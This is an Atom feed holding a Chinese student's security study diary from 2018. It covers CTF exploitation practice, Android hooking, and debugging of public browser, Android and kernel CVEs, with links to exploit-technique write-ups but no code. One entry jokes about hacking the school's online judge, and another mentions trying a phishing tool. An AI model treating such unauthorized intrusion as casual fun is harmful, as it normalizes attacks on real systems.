<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sakuraのblog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://eternalsakura13.com/"/>
  <updated>2018-07-20T02:34:07.885Z</updated>
  <id>http://eternalsakura13.com/</id>
  
  <author>
    <name>sakura</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Sakuraのdiary</title>
    <link href="http://eternalsakura13.com/2099/09/18/study/"/>
    <id>http://eternalsakura13.com/2099/09/18/study/</id>
    <published>2099-09-18T14:05:42.000Z</published>
    <updated>2018-07-20T02:34:07.885Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2018-1-28"><a href="#2018-1-28" class="headerlink" title="2018-1-28"></a>2018-1-28</h2><p>1.看玄武实验室的每日安全推送（主要是看了android挖矿，p2p蠕虫）<br>2.配置shadow<br>尝试用gdb和gdbserver来调试<br><a href="https://github.com/CENSUS/shadow" target="_blank" rel="noopener">https://github.com/CENSUS/shadow</a><br><a href="https://developer.android.com/ndk/downloads/index.html?hl=zh-cn" target="_blank" rel="noopener">https://developer.android.com/ndk/downloads/index.html?hl=zh-cn</a><br><a href="http://kiya.studio/2017/06/21/android-gdb/" target="_blank" rel="noopener">http://kiya.studio/2017/06/21/android-gdb/</a><br>shadow文档的几个坑点</p><ul><li>arm-linux-androideabi-gdb，也就是gdb-arm版没有提供，要自己找，我装了一个ndk r10e，然后弄了一个，嗯，r11移除了gdb。</li><li>在gdb remote之前，文档里没有写forward转发，导致我试的时候一直refuse</li></ul><p>3.晚上最大的收获是看到了一个不错的blog（android逆向CTF）<br><a href="http://kiya.studio/2333/03/03/android-reversing-skills/#more" target="_blank" rel="noopener">http://kiya.studio/2333/03/03/android-reversing-skills/#more</a></p><h2 id="2018-1-29"><a href="#2018-1-29" class="headerlink" title="2018-1-29"></a>2018-1-29</h2><ol><li>看玄武的<a href="https://mp.weixin.qq.com/s/mOaXkGTY2704P6TV2KBvwg" target="_blank" rel="noopener">每日安全推送</a>，主要看了WinAFL</li><li>nexus5被我刷成砖……然后顺手把刷机、root和装xposed全都整理了一遍。</li><li>webkit的poc断点找到了，可以调了</li><li>做了一道阿里CTF第二题，一道关于反调试的题。</li></ol><h2 id="2018-1-31"><a href="#2018-1-31" class="headerlink" title="2018-1-31"></a>2018-1-31</h2><ol><li>看AI直播调webkit，感觉调浏览器好难呀。</li><li>看玄武的<a href="https://mp.weixin.qq.com/s/M4QZxs_G-lZ810o_i2KJhA" target="_blank" rel="noopener">每日安全推送</a>，主要关注了反调试和使用Strava 热力图来推断军事基地位置，很有趣的思路。</li><li>研究了一下加固原理和脱壳基础：dvmDexFileOpenPartial，还挺简单的。</li><li>研究了ptrace和调试器原理，了解了ptrace反调试的一些技巧</li></ol><h2 id="2018-2-1"><a href="#2018-2-1" class="headerlink" title="2018-2-1"></a>2018-2-1</h2><ol><li>本来想今天研究一下ndk编译的，不过睡着了……然后也没看什么东西</li><li>帮学弟解决了一些搭建博客的bug，顺便自己把博客的主题配色，代码高亮，搜索，评论什么的都修改或添加了，好看多了……</li></ol><h2 id="2018-2-2"><a href="#2018-2-2" class="headerlink" title="2018-2-2"></a>2018-2-2</h2><ol><li>看玄武的<a href="https://xuanwulab.github.io/cn/secnews/2018/02/02/index.html" target="_blank" rel="noopener">每日安全推送</a></li><li>钓鱼网站那个很有趣，我就测试了一下，然后因为ss代理不走终端，找了<a href="https://juejin.im/entry/5821840cd203090055134cc0" target="_blank" rel="noopener">一篇文章</a>和<a href="https://blog.kelu.org/tech/2017/07/06/parallels-vm-use-proxy-with-host-on-mac.html" target="_blank" rel="noopener">另一篇文章</a>，配置了一下就好了~</li><li>自己实践了一下那个钓鱼工具，实践文章和终端那个都可以在”杂项”分类里找到</li><li>研究了一下怎么用ndk-build编译一个能在手机上运行的c程序，这样明天就可以尝试hook了</li></ol><h2 id="2018-2-3"><a href="#2018-2-3" class="headerlink" title="2018-2-3"></a>2018-2-3</h2><ol><li>今天没有玄武的推送看~</li><li>研究了android native层hook，算是学到不少东西了。</li></ol><h2 id="2018-2-4"><a href="#2018-2-4" class="headerlink" title="2018-2-4"></a>2018-2-4</h2><ol><li>写了第一个xposed程序~遇到了一些坑，不过还是趟过去了。</li><li>修改nexus5的boot.img,打开系统调试，又坑了我一会。。</li></ol><h2 id="2018-2-5"><a href="#2018-2-5" class="headerlink" title="2018-2-5"></a>2018-2-5</h2><ol><li>今天出去怠惰了（茶）</li><li>xposed继续学习了一下，学会了一些姿势，感觉还是不错的~</li></ol><h2 id="2018-2-6"><a href="#2018-2-6" class="headerlink" title="2018-2-6"></a>2018-2-6</h2><ol><li>研究了怎么搭建shadowsocks服务端和优化，顺便卖了几个~</li><li>自己写了一个基于flask的B/S端口扫描器，代码太难看就不放了（茶</li></ol><h2 id="2018-2-7"><a href="#2018-2-7" class="headerlink" title="2018-2-7"></a>2018-2-7</h2><ol><li>继续看玄武每日推送<a href="https://mp.weixin.qq.com/s/FM-mZh1e8YQP0MWrV1IlVw" target="_blank" rel="noopener">2.6</a>和<a href="https://mp.weixin.qq.com/s/2JMrsyyuTErVy-pXRoL3Jg" target="_blank" rel="noopener">2.7</a><br>wordpress DOS有点意思，不过没搞懂，另外主要看了android安全公告2月版，看懂了一些（限于原理），开发太菜了。</li><li>学习了android的jni开发，基本的都摸了一遍。</li></ol><h2 id="2018-2-8"><a href="#2018-2-8" class="headerlink" title="2018-2-8"></a>2018-2-8</h2><ol><li>继续昨天的jni学习，摸清了native方法的动态注册</li><li>研究了下.init_array,结合jni动态注册，做了一道CTF题</li><li>继续看玄武每日推送<a href="https://mp.weixin.qq.com/s/sqPmC-z-HiH4UKArE1Gdgw" target="_blank" rel="noopener">2.8</a>,这篇<a href="https://www.fireeye.com/blog/threat-research/2018/02/reelphish-real-time-two-factor-phishing-tool.html" target="_blank" rel="noopener">钓鱼</a>的有趣</li><li>给AI写了个爬页面上文件的爬虫。</li></ol><h2 id="2018-2-9"><a href="#2018-2-9" class="headerlink" title="2018-2-9"></a>2018-2-9</h2><ol><li>研究android构建过程，Gradle工作流程</li><li>读玄武每日推送（存了个移动端静态分析的github准备好好看看）</li></ol><h2 id="2018-2-10"><a href="#2018-2-10" class="headerlink" title="2018-2-10"></a>2018-2-10</h2><ol><li>研究Dex文件格式和修复</li><li>学习了用ddms来dump出运行内存做题的技巧。</li><li>学习了新建android工程，调so文件解题。</li></ol><h2 id="2018-2-11"><a href="#2018-2-11" class="headerlink" title="2018-2-11"></a>2018-2-11</h2><ol><li>把昨天看到一道递归算法的android re做了，感觉现在做一般的CTF都有点思路了，做看雪的还是GG，还要提高姿势水平。</li><li>今天上午看到我在知乎的提问有师傅回答我了：<a href="https://www.zhihu.com/question/266901100/answer/316607339，然后作死的又打开了这个洞CVE-2015-3864，嗯...我调没调出来，忙活了一上午，断点都没断下来，但是起码……嗯，我记住了名字！libstagefright，我是记住了……别等我学会了来找你。。" target="_blank" rel="noopener">https://www.zhihu.com/question/266901100/answer/316607339，然后作死的又打开了这个洞CVE-2015-3864，嗯...我调没调出来，忙活了一上午，断点都没断下来，但是起码……嗯，我记住了名字！libstagefright，我是记住了……别等我学会了来找你。。</a></li><li>今天下午做完题就又瞎看了一会，思考我是不是选错了方向……android的调试贼麻烦，资料还贼少，看了看看雪，主要是浏览器、文件格式和内核，虽然其实都一样的，那些资料也不多，没法挖洞的……认识的dalao又少，没法充分交流QAQ，唉，感觉我是不是不适合当黑客，看vulcan的师傅微博，月月一大批CVE，就我什么都挖不到，不过今晚看了看师傅们的博客，他们的心路历程给了我很大勇气，是的，我早就不打算退后了，只有前进而已。</li></ol><h2 id="2018-2-12"><a href="#2018-2-12" class="headerlink" title="2018-2-12"></a>2018-2-12</h2><ol><li>今天刷空间看到moctf比赛，就参加了下，把android/linux re做掉就没看了。</li><li>依然很迷茫，不过其实想想，我开始学二进制，其实也就不到半年，进步速度并不是不能接受，只是在技能进阶上卡住了又没人交流而已，嗯，再想想好了。</li></ol><h2 id="2018-2-13到19"><a href="#2018-2-13到19" class="headerlink" title="2018-2-13到19"></a>2018-2-13到19</h2><ol><li>这些天几乎都过年去了……然后唯一做了点事就是把自己的课程设计做了，<a href="https://github.com/eternalsakura/PortScan" target="_blank" rel="noopener">PortScan</a></li><li>新年新气象，最近家里的事情也是乱七八糟，能多学点赚钱的技术分担压力就好了。</li><li>下学期的计划——fuzz、CVE漏洞研究、前端后端的一些Web开发（写点相关项目练手），然后找实习。</li><li>学会了一项新的运动，保龄球，很有意思。</li><li>最近一直什么都没学，自己也在反思一些东西，寻找一个前进的点。<br>比如浏览器，文件格式，还是内核，或者其他，还是都不是。<br>安全只是个抽象的概念，具体化了才能变成业务。<br>我还需要探究一段时间，读很多的漏洞分析文章，追随前辈们走过的路途，再进一步反思。<br>“一个漏洞的产生到漏洞利用至少会经历好几个阶段：Bug –&gt; exploitable bug(vulnerability) –&gt; poc –&gt; exploit –&gt; reliable/weaponized exploit。虽然大家都喜欢把fuzzing出来的bug讲成blah-blah-blah的故事或者作为PR，但我们真正关心的漏洞应该是能到最后两个阶段的vulnerability。”</li></ol><h2 id="2018-2-20到21"><a href="#2018-2-20到21" class="headerlink" title="2018-2-20到21"></a>2018-2-20到21</h2><ol><li>返校真是艰难……飞机火车客车出租全都转了一遍才到……</li><li>晚上收拾了下房间，看了看看雪，发现师傅做的有趣CTF题，<a href="https://bbs.pediy.com/thread-224686.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-224686.htm</a></li><li>群里在讨论内存管理和hook，被推荐了一本腾讯的手游安全的书《游戏安全：手游安全技术入门》，还不错，可以入个门……</li><li>看到一个博客提供了一些自定义ROM的资料，最近也想改，看到了就记录一下。<a href="https://my.oschina.net/ibuwai/blog?catalog=3379629&amp;temp=1519222237338" target="_blank" rel="noopener">https://my.oschina.net/ibuwai/blog?catalog=3379629&amp;temp=1519222237338</a></li></ol><h2 id="2018-2-22"><a href="#2018-2-22" class="headerlink" title="2018-2-22"></a>2018-2-22</h2><ol><li>看了《手游安全技术那本书》，学习了注入技术。</li><li>下午买了考虫的口语能力提升班，然后学习了下</li><li>晚上在seebug逛，找各种二进制漏洞分析的资料，然后看到了陈良的ppt,remet的github,韩子诺的文章，还有很多很多……CVE-2014-7911感觉可以调调，我得整理整理我搜的资料，然后按照原理-&gt;漏洞分析-&gt;exp去学习w</li></ol><h2 id="2018-2-23到25"><a href="#2018-2-23到25" class="headerlink" title="2018-2-23到25"></a>2018-2-23到25</h2><ol><li>是的，仔细算算，我已经编译AOSP编译了三天了，而且还没编译好……现在已经基本放弃在mac上编译了，我现在突然想,flanker大神之所以用ubuntu做主力机……是不是因为在mac上编译不出AOSP呀……(逃)</li><li>明天在旧电脑上装win/ubuntu的双系统，要不是因为这学期有win网络编程和c#开发……我就直接烧ubuntu进去了（撑脸</li><li>嗯，不用明天了，在今天的收尾……新学期的开始……我终于是守得云开见月明，把AOSP弄出来了！</li></ol><h2 id="2018-2-26"><a href="#2018-2-26" class="headerlink" title="2018-2-26"></a>2018-2-26</h2><ol><li>学习了stack pivot，<a href="http://tacxingxing.com/2017/05/10/stack-pivot/" target="_blank" rel="noopener">劫持栈指针</a></li><li>学习了heap spray,<a href="http://secwiki.neu.edu.cn/wiki/images/f/fe/%E5%86%85%E5%AD%98%E5%96%B7%E5%B0%84%E5%9C%A8%E5%AE%89%E5%8D%93Root%E5%88%A9%E7%94%A8%E4%B8%AD_%E9%99%88%E8%89%AF.pdf" target="_blank" rel="noopener">堆喷</a></li><li>学习了<a href="http://pwn4.fun/2016/11/20/C-虚函数调用攻防战/" target="_blank" rel="noopener">虚表攻防</a></li><li>了解android<a href="https://www.blackhat.com/docs/us-15/materials/us-15-Xu-Ah-Universal-Android-Rooting-Is-Back.pdf" target="_blank" rel="noopener">root</a></li><li>Time-of-check Time-of-use (TOCTOU) Race Condition</li><li>今天还是认真的研究了一下之前没调出来的cve-2015-3864，因为这个漏洞有完整的利用链资料，非常的棒，虽然可能调不了什么的，但是理解这个利用过程也很有意义。<br>还是要感谢一下看雪师傅的<a href="https://bbs.pediy.com/thread-222893.htm" target="_blank" rel="noopener">文章</a>，还加了好友0.0，感觉要是我一开始就是编译的AOSP去调试……可能寒假就调出来了2333，反正感觉今天还是很有收获的。</li></ol><h2 id="2018-2-27"><a href="#2018-2-27" class="headerlink" title="2018-2-27"></a>2018-2-27</h2><ol><li>一上午调了道64位rop，还没调出来..exm???是这题的错还是我的错…多看看别人的exp好了，以前还是做题不够，积累不够。</li><li>继续看stagefright好了，争取今天多少调一调。</li><li>好吧，没看进去，gp0的exp大致看懂了，不过metaphor的思路还是费解，可能我现在的理解力还是不够。</li><li>下午一直在整理之前看的ptmalloc的一些基本概念，虽然意义不是很大，但是理一理总是好的，还是要为ctf-wiki打call，里面写了非常多的干货，明天继续整理。</li></ol><h2 id="2018-2-28"><a href="#2018-2-28" class="headerlink" title="2018-2-28"></a>2018-2-28</h2><ol><li>体育课累死……密码学数学基础有趣。</li><li>今天把heap exploit的unlink整理了一下，虽然最后那个例子有点问题，我换了两个系统都没成功，但是原理还是理清了，真的是都快忘了……</li></ol><h2 id="2018-3-1"><a href="#2018-3-1" class="headerlink" title="2018-3-1"></a>2018-3-1</h2><ol><li>又混了篇看雪的优秀，感觉还是蛮有成就感的，自己发的文章都不是优秀就是精品。</li><li>今天有点怠惰呢，明天要继续努力。</li></ol><h2 id="2018-3-2"><a href="#2018-3-2" class="headerlink" title="2018-3-2"></a>2018-3-2</h2><ol><li>今天一天都在整理fastbin的一个内容（其实还玩了一会Web，黑掉学校OJ嘿嘿嘿）</li><li>这道赛题略难，然后跟团队练习赛的PragyanCTF，感觉这赛题像是file io啊。。谁出的题这么皮。。</li></ol><h2 id="2018-3-3"><a href="#2018-3-3" class="headerlink" title="2018-3-3"></a>2018-3-3</h2><ol><li>生日快乐~自己，去订了蛋糕，今天继续研究了一下那个fastbin的题，真的很难。。</li><li>把android kernel也编译了出来，这次真的是可以调了。。</li></ol><h2 id="2018-3-4"><a href="#2018-3-4" class="headerlink" title="2018-3-4"></a>2018-3-4</h2><ol><li>今天和实验室大一的聊了下，然后把我能知道的东西，方向什么的，都聊了一下。</li><li>9447 CTF 2015的fastbin是真的难……我还是不懂，算了算了，明天看点别的吧，这个todo。</li><li>今天和一个师傅聊了下IoT漏洞应该怎么挖，受益匪浅，但是转换为具体的硬实力还需要多看多学多调。</li></ol><h2 id="2018-3-5"><a href="#2018-3-5" class="headerlink" title="2018-3-5"></a>2018-3-5</h2><ol><li>今天把那道fastbin的题认真的理了理，其实也不是很难，然后又把pragyan ctf2018的两道pwn题做了一下，第一道还好，那个目录遍历没理解上，看了wp会了，第二道就有点迷，静态链接下的格式化字符串漏洞，没办法覆盖got表，看了一篇wp是覆盖malloc_hook，这不是我白天看的那道fastbin的套路么……真的是……然后打开栈执行，这……真是脑洞，又感觉自己很菜……</li><li>嗯w，文章又被看雪推送了，还是感觉蛮不错的……希望能认识更多人吧w，今天看了看玄武每日推送的目录，非常nice，准备找个时间把这段时间没看的都啃一下。</li></ol><h2 id="2018-3-6"><a href="#2018-3-6" class="headerlink" title="2018-3-6"></a>2018-3-6</h2><ol><li>上周的比赛，搞到今天总算是大致调完了，就只剩一个点不懂，也是实在搞不懂了，教主说的很有道理，只有把文章写成博客，发出去，才能检验你到底对这个东西的理解怎么样，事实上，也只有在学习中的我，才会如此详细的写wp吧。</li></ol><h2 id="2018-3-7-8"><a href="#2018-3-7-8" class="headerlink" title="2018-3-7-8"></a>2018-3-7-8</h2><ol><li>这两天把漏洞战争的环境大致搭了一下，从用windbg到看到符号，还是折腾了一下。</li></ol><h2 id="2018-3-9-10"><a href="#2018-3-9-10" class="headerlink" title="2018-3-9-10"></a>2018-3-9-10</h2><ol><li>调了一下漏洞战争堆的第一个binary，然后熟悉了一下工具使用，还是nice.</li><li>调了cve-2012-1876的poc，发现了一些书上没有提到的地方和一个错误，就不提勘误了…都出了这么久了…原理差不多懂了，很有趣。</li><li>今天有意想不到的收获，或者说机会吧，希望我能把握好，然后做好安全研究，成为一个优秀的黑客。</li><li>列一个CVE调试计划吧，目前进度1/10<br>浏览器<br>3.7 CVE-2012-1876,堆溢出（p2o ie9)<br>4.3 CVE-2011-0027,整数溢出漏洞 (p2o ie8)<br>4.6 CVE-2013-2551,整数溢出漏洞(p2o ie10)<br>7.4 CVE-2013-1347,UAF(ie)<br>android<br>10.7 CVE-2014-3153 anroid kernel提权</li></ol><h2 id="2018-3-11-12"><a href="#2018-3-11-12" class="headerlink" title="2018-3-11-12"></a>2018-3-11-12</h2><ol><li>这两天进度比较低迷，第一天直接莽上去调exp然后被打脸…今天把vupen的文章仔细读了一遍，把整个利用过程理解了一下。</li><li>说来有个有趣的点，p2o之后cve-2012-1876不是应该补了么，怎么在win8+ie10上还能利用，更有趣的是vupen明明用这个洞getshell了ie9，但是为什么keen在Study of Exploit Migitation in Modern Browsers这个ppt上说了bstr的分配不再能被利用，那vupen到底是怎么写的exp…</li><li>最近的计划（才怪…</li></ol><ul><li>编译的前端后端</li><li>kernel的漏洞</li><li>看diff写poc…</li></ul><h2 id="2018-3-13-14"><a href="#2018-3-13-14" class="headerlink" title="2018-3-13-14"></a>2018-3-13-14</h2><ol><li>密码学数学基础和算法这些课也就算了，晚上还有软件开发的课，各种文档什么的…能不能好好lu代码，把之前写的项目project答辩完了。</li><li>等到了想等的结果，收心认真学习了。</li><li>晚上把计算机系统素养里的部分内容（VM）又看了一下，十分有意义。</li><li>为了学编译原理，先自己lu一个c语言解释器了解个大概吧。</li></ol><h2 id="2018-3-15-17"><a href="#2018-3-15-17" class="headerlink" title="2018-3-15-17"></a>2018-3-15-17</h2><ol><li>这几天把write a c interpret看完了，大致了解了编译器前后端，当然肯定现在还是不会写的。</li><li>调cve-2012-7864,虽然称不上调通exp，但是大部分都调出来了，poc调的很顺利，在exp就处处踩坑。</li><li>说来好像webkit的dom的堆被分开了，以后就不会有那么多uaf了。</li></ol><h2 id="2018-3-18-20"><a href="#2018-3-18-20" class="headerlink" title="2018-3-18-20"></a>2018-3-18-20</h2><ol><li>日记还是要每天记……都忘了自己每天做了什么了……把c++的project做完了，做了两道pwn题。</li><li>看了一下LCTF2017的题目,large bin的unlink确实没练过，还有一道simpleVM改的题，都做做好了。</li></ol><h2 id="2018-3-21-25"><a href="#2018-3-21-25" class="headerlink" title="2018-3-21-25"></a>2018-3-21-25</h2><p>lctf2017的题目里学到不少东西，另外关于堆利用的姿势实在是不足，此外无libc利用这个也要再学习一下。<br>这几天除了两个project写，还打了强网杯，感觉就是什么都不会吧。。可能不该死磕一道题，应该都看看？…啊啊啊，难受死了，离顶尖水平差的根本不是一点半点……<br>还看了一篇清华的论文，非常nice。<a href="http://jcs.iie.ac.cn/ch/reader/view_abstract.aspx?file_no=20180101&amp;flag=1" target="_blank" rel="noopener">http://jcs.iie.ac.cn/ch/reader/view_abstract.aspx?file_no=20180101&amp;flag=1</a><br>还是有的挫败呢，离别人的水平。</p><h2 id="2018-3-26"><a href="#2018-3-26" class="headerlink" title="2018-3-26"></a>2018-3-26</h2><p>1.读玄武每日推送[<a href="http://chuansong.me/n/2253059751415" target="_blank" rel="noopener">http://chuansong.me/n/2253059751415</a>].</p><ul><li>mark一下<a href="https://rootkits.xyz/blog/2018/03/kernel-uninitialized-heap-variable/" target="_blank" rel="noopener">windows kernel漏洞利用</a>，mark一下k0师傅的<a href="https://whereisk0shl.top/post/2018-03-21" target="_blank" rel="noopener">UBUNTU 16.04 EBPF ARBITRARY READ/WRITE 漏洞分析</a>和360src的<a href="https://cert.360.cn/report/detail?id=ff28fc8d8cb2b72148c9237612933c11" target="_blank" rel="noopener">这篇</a>,看来调kernel还是有的调。</li><li>看到的<a href="https://github.com/sashs/arm_exploitation/blob/master/exploitation_on_arm_based_systems.pdf" target="_blank" rel="noopener">ARM exp开发</a>就很简略，感觉学不到什么东西。</li><li>mark一个超棒的<a href="http://www.makelinux.net/kernel_map/" target="_blank" rel="noopener">linux kernel交互图</a>，还能在页面上点击跳转到资料<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-26-LKM3_2048.png" alt=""></li><li>还有一个Stack pivoting  exploit的图收了,不知道他们怎么画的图这么好看。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-26-030340.jpg" alt=""></li><li><a href="https://static1.squarespace.com/static/552092d5e4b0661088167e5c/t/5a00963153450a8779b23489/1509987890282/Windows" target="_blank" rel="noopener">windows注册表审计</a>感觉以后用得到</li><li><a href="https://twitter.com/_niklasb/status/977141034059747328" target="_blank" rel="noopener">p2o的沙盒逃逸漏洞</a>这个感觉十分有意思。</li><li>blackhat上总有很多好议题，比如这个<a href="https://www.blackhat.com/docs/asia-18/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf" target="_blank" rel="noopener">绕过ASLR的新思路</a></li></ul><p>2.准备配linux kernel的调试环境，真的是……配不起来啊，双机调试，拉取符号文件，设置串口，改配置开启调试功能。rbq,rbq<br>3.加入了chamd5团队，有师傅一起学pwn，一起讨论真是太棒了QVQ</p><h2 id="2018-3-27"><a href="#2018-3-27" class="headerlink" title="2018-3-27"></a>2018-3-27</h2><ol><li><p>上午和出强网杯kernel题的师傅聊了一下kernel的调试环境搭建和赛题，师傅人蛮好。。<br>搭建的话，muhe师傅的<a href="https://www.anquanke.com/post/id/85837" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85837</a><br><strong>编译linux 注意去掉不必要的东西，然后编译busybox 然后插入内核  写linux init 最后制作cpio</strong><br>这样就可以qemu+gdb调试了，很nice。</p></li><li><p>下午和晚上忙各种杂七杂八的事情反正……不过总算还是把要复盘的赛题做完了。</p></li><li>另外，感觉自己的努力和天赋还是被人肯定的，加油吧，自己QVQ。</li></ol><h2 id="2018-3-28"><a href="#2018-3-28" class="headerlink" title="2018-3-28"></a>2018-3-28</h2><ol><li>人生这种东西，其实就是起起落落落落落落落落落落落落落落落落落落落落落落落落落落落落，23333<br>瞎看了半天linux inside，还看了下linux x86-64 asm，感觉没什么进展。</li><li>晚上在知乎提了个问题，别人指了一条很nice的路线给我，还和其他人get了一点点资料，感觉我应该也是可以搞的吧，嗯哼。<br>其实今天一直比较浮躁，还是昨天晚上的一些后遗症吧，还有就是期望和现实的落差……<br>不过冷静的回想一下，不能让自己立刻从舒适区脱离，从新掌握新的知识，那怎么进步呢？且行且努力（乖巧</li></ol><h2 id="2018-3-29"><a href="#2018-3-29" class="headerlink" title="2018-3-29"></a>2018-3-29</h2><ol><li>这几天事挺多的，今天才把blackhat的ppt都下载下来,然后看了下<a href="https://0x00sec.org/t/linux-internals-the-art-of-symbol-resolution/1488" target="_blank" rel="noopener">linux符号解析</a>还发现了一个<a href="https://github.com/elfmaster/skeksi_virus" target="_blank" rel="noopener">正在开发中的linux病毒</a></li><li>收集了蛮多linux kernel资料慢慢啃……今天啃了两个ppt，纯英文的那么多……我也是很意外自己读起来没什么障碍的……<br>学什么都要一步一步呀，能调通一个，调试就没什么了，后面的学习速度就看对于kernel和保护的理解了。</li></ol><h2 id="2018-3-30-31"><a href="#2018-3-30-31" class="headerlink" title="2018-3-30-31"></a>2018-3-30-31</h2><ol><li>这两天发生的事情还蛮多的，最近发生的一些事让我觉得，自己调的真洞还是太少，调就要调出来还要能调通，不过说实话吧……浏览器和kernel的洞真的不好调，我学二进制又不久……现在比赛练pwn都来不及，还要分身调洞，确实有点难啊……</li><li>不过kernel的ppt啃了俩，感觉纯英文的资料也就那个样子了，读起来还是挺流畅的，要是真的不懂换成中文我也不懂……</li><li>把kernel题的环境搭起来了，有师傅请教真的是比自己搞好太多……另外堆的题感觉有感觉了，准备给自己一个比较长的训练周期，比如十天，彻底脑内模拟透，最近进步还是蛮多，加油。<br>mark一个师傅的<a href="http://veritas501.space/2018/03/28/%E4%B8%A4%E6%AC%A1CTF%E6%AF%94%E8%B5%9B%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">博客</a></li></ol><h2 id="2018-4-1-3"><a href="#2018-4-1-3" class="headerlink" title="2018-4-1-3"></a>2018-4-1-3</h2><ol><li>打了一场0ctf，感觉自己还是太菜，不过在师傅们的帮助下，把能搞懂的题都搞懂了，学到很多很多东西，还是很开心的。</li><li>写wp太麻烦了坦白说。。不过还是写吧，不写的话自己都不知道能记得多久……</li></ol><h2 id="2018-4-4-11"><a href="#2018-4-4-11" class="headerlink" title="2018-4-4-11"></a>2018-4-4-11</h2><ol><li>这几天电脑键盘坏了，电脑送修什么都没干。下了个吃鸡手游，嗯，还挺好玩的，今天早上电脑到了删了。</li><li>把0ctf2018的4道pwn复盘完了，折腾kernel调试环境。。还是挺麻烦的。</li><li>想要的很简单，得到却很难，好想去实验室做安全研究。</li></ol><h2 id="2018-4-12"><a href="#2018-4-12" class="headerlink" title="2018-4-12"></a>2018-4-12</h2><ol><li>今天从qemu+gdb，各种花式报错，到搭建内核的双机调试，简直了……总算最后是勉强在win机器上弄好了。<br>今天得到的一个启发是，先找一个可以用的方案去做，不要想什么一次做到最好，到有机会再换方案。</li><li>英语作业还没做……唉……赶作业赶作业……</li></ol><h2 id="2018-4-13"><a href="#2018-4-13" class="headerlink" title="2018-4-13"></a>2018-4-13</h2><ol><li>今天也是一堆事情，睡到中午然后开始做ddctf，那个逆向的mips还有android逆向的RSA，pwn的win kernel exploit真的是有、意思。反正我不想做了，不如学习一个<a href="https://blog.betamao.me/2018/02/26/ptmalloc%E5%B0%8F%E8%AE%B0/" target="_blank" rel="noopener">新姿势</a></li><li>linux kernel调试的环境算是彻底搭好了，今天解决了两个昨天没解决的bug，已经可以看到源码了。</li></ol><h2 id="2018-4-14-15"><a href="#2018-4-14-15" class="headerlink" title="2018-4-14-15"></a>2018-4-14-15</h2><ol><li>解决了内核不能单步调试的问题，然后在复习信安数学了。。再不看要凉了</li><li>仔细跟了一下poc，感觉还是能看懂的。</li></ol><h2 id="2018-4-16-17"><a href="#2018-4-16-17" class="headerlink" title="2018-4-16-17"></a>2018-4-16-17</h2><ol><li>自己看了下日记，4月除了修电脑配环境，几乎什么都没做，这段时间心态太浮躁了，嗯，加个太，也要准备投几家实习了，本来以为可以拿到的offer，都感觉凉了，不过算了，我是要去实验室做安全研究的人呢。</li><li>分析了cve-2017-8890的漏洞成因和模型还有patch</li></ol><h2 id="2018-4-18"><a href="#2018-4-18" class="headerlink" title="2018-4-18"></a>2018-4-18</h2><ol><li>今天也是一堆的课，晚上和师傅们聊天聊八卦去了。。结果只把UAF对象的分配和释放调了调。</li><li>了解了一下实验室面试啥的，要好好调CVE了。</li></ol><h2 id="2018-4-19"><a href="#2018-4-19" class="headerlink" title="2018-4-19"></a>2018-4-19</h2><ol><li>看了看师傅们的面试题，觉得其实自己还能再抢救一下。。</li><li>今天看了长亭的kernel的洞，感觉分析成因还是很好分析的…但是exp调起来麻烦，也懒得写博客记录了，今天把webkit的调试记录了一下，明明好久之前就搞了，结果到现在还是这样没什么进展（茶</li></ol><h2 id="2018-4-20-21"><a href="#2018-4-20-21" class="headerlink" title="2018-4-20-21"></a>2018-4-20-21</h2><ol><li>编了一天v8，搞不出来，墙真讨厌。</li><li>调（看）了一个webkit的UAF漏洞，还行，感觉最难懂的还是对象之间的引用关系太复杂，还有就是回调函数跟着跟着容易找不到自己在哪。<br>“我是谁，谁在打我。”（逃）</li></ol><h2 id="2018-4-22-24"><a href="#2018-4-22-24" class="headerlink" title="2018-4-22-24"></a>2018-4-22-24</h2><ol><li>打了一场*ctf，又学到了新姿势。</li><li>在看v8，看JIT，看R大的回答，xjb搜文章，还是不错。</li><li>调通了p2o的一个v8的oob的洞，cve-2017-5053,还是不难。</li></ol><h2 id="2018-4-25-28"><a href="#2018-4-25-28" class="headerlink" title="2018-4-25-28"></a>2018-4-25-28</h2><ul><li><p>补一些浏览器的基础吧</p></li><li><p>学习了一下一个新的内核洞，有新的trick总结</p></li><li>最近觉得该搞搞利用了，路由器固件也可以玩一下，安全研究这么有趣，什么都能摸一下（才怪</li></ul><h2 id="2018-4-29-30"><a href="#2018-4-29-30" class="headerlink" title="2018-4-29-30"></a>2018-4-29-30</h2><ol><li>国赛打完了，各种不走心，状态奇差，混进赛区半决赛了，CTF也玩到这了吧先，后面好好研究浏览器。</li><li>看了Natalie Silvanovich写的How to Find JavaScript Vulnerabilities with Code Review</li></ol><ul><li>Determine intended functionality</li><li>Review implementation of important features</li><li>Review previously reported bugs</li><li>Brainstorm likely vulnerable areas</li><li>Review code!<br>Mozilla docs (MDN) is a great start for JS</li></ul><ol><li>想翻一些议题视频看的时候翻到了一个仓库，js vul的，存一下，<a href="https://github.com/tunz/js-vuln-db" target="_blank" rel="noopener">js-vuln-db</a></li></ol><h2 id="2018-4-31-5-2"><a href="#2018-4-31-5-2" class="headerlink" title="2018-4-31-5.2"></a>2018-4-31-5.2</h2><ol><li>看了一个js optimized code<a href="https://www.microsoft.com/en-us/research/video/chakra-script-optimized-code/" target="_blank" rel="noopener">视频</a>，虽然是chakra的<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-02-074634.png" alt=""><br>不过感觉，有点没用…这些我都知道（</li><li>看v8的gc,利用和各种，反正还是挺迷的，先看吧QVQ</li><li>看到一幅很棒的图，新的v8的执行图？<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-02-151804.jpg" alt=""></li><li>看webkit技术内幕找灵感，看洞有点看不明白了。</li></ol><h2 id="2018-5-3"><a href="#2018-5-3" class="headerlink" 